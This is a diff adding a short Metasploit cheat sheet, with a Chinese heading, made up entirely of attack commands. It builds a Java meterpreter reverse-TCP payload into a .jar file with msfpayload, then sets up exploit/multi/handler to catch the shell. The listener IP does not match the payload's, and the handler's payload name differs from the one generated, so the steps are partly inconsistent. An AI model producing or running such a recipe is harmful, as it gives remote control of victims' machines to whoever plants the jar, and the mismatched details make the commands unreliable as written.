@@ -1,0 +1,9 @@
+msfpayload java/meterpreter/reverse_tcp LHOST=192.168.2.133 LPORT=1125 X>123.jar
+
+监听shellcode
+msf
+use exploit/multi/handler
+set payload java/meterpreter_tcp
+set LHOST 192.168.2.113
+set LPORT 1125
+exploit
